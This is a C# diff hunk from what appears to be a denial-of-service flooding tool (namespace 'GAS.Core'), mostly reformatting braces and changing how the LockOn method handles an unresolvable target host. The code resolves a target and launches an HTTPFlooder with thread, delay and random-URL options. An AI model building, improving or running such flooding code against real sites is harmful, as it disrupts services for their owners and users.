@@ -27,49 +27,60 @@ namespace GAS.Core
         static IPAddress locolhaust = IPAddress.Parse("127.0.0.1");
         public IAttacker Worker;
         public string Data;
-        public int Requested {
-            get {
+        public int Requested
+        {
+            get
+            {
                 return Worker.Requested;
             }
         }
-        public int Failed {
-            get {
+        public int Failed
+        {
+            get
+            {
                 return Worker.Failed;
             }
         }
-        public int Downloaded {
-            get {
+        public int Downloaded
+        {
+            get
+            {
                 return Worker.Downloaded;
             }
         }
-        public bool LockOn(string host) {
+        public bool LockOn(string host)
+        {
             host = host.Trim().ToLower();
-            if ( IPAddress.TryParse(host, out Target) ) {
+            if (IPAddress.TryParse(host, out Target))
+            {
                 DNSString = Target.ToString();
                 return true;
             }
-            else {
-                try {
-                    if ( !host.StartsWith("http://") && !host.StartsWith("https://") ) host = String.Concat("http://", host);
-                    var trg = new Uri(host);
-                    Target = Dns.GetHostEntry(trg.Host).AddressList[0];
-                    DNSString = trg.Host;
-                    Subsite = trg.PathAndQuery;
-                    return true;
-                }
-                catch {
-                    Target = locolhaust;
-                    throw new Exception("Wrong HOST");
-                }
+            try
+            {
+                if (!host.StartsWith("http://") && !host.StartsWith("https://")) host = String.Concat("http://", host);
+                var trg = new Uri(host);
+                Target = Dns.GetHostEntry(trg.Host).AddressList[0];
+                DNSString = trg.Host;
+                Subsite = trg.PathAndQuery;
+                return true;
+            }
+            catch
+            {
+                Target = locolhaust;
+                return false;
             }
         }
-        public void Stop() {
-            if ( Worker != null )
+        public void Stop()
+        {
+            if (Worker != null)
                 Worker.Stop();
         }
-        public void Start() {
+        public void Start()
+        {
             Stop();
-            switch ( Method ) {
+            switch (Method)
+            {
                 case AttackMethod.HTTP:
                     Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 0, SPT);
                     break;
